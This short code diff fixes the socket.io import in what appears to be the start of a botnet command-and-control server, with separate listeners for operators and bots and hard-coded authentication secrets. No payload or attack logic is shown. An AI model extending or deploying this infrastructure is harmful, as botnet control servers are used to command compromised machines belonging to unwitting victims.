@@ -1,10 +1,6 @@
-import { socketIo } from 'socket.io';
-
-
-
-
-const cncServer = new socketIo(7035);
-const botServer = new socketIo(7305);
+import { Server } from 'socket.io';
+const cncServer = new Server(7035);
+const botServer = new Server(7305);
 
 const OperatorSecret = "DEADBEEF"; // This will be required for operator to send to authenticate
 const BotSecret = "BoT"; // This will be required for bot to verify it's integrity
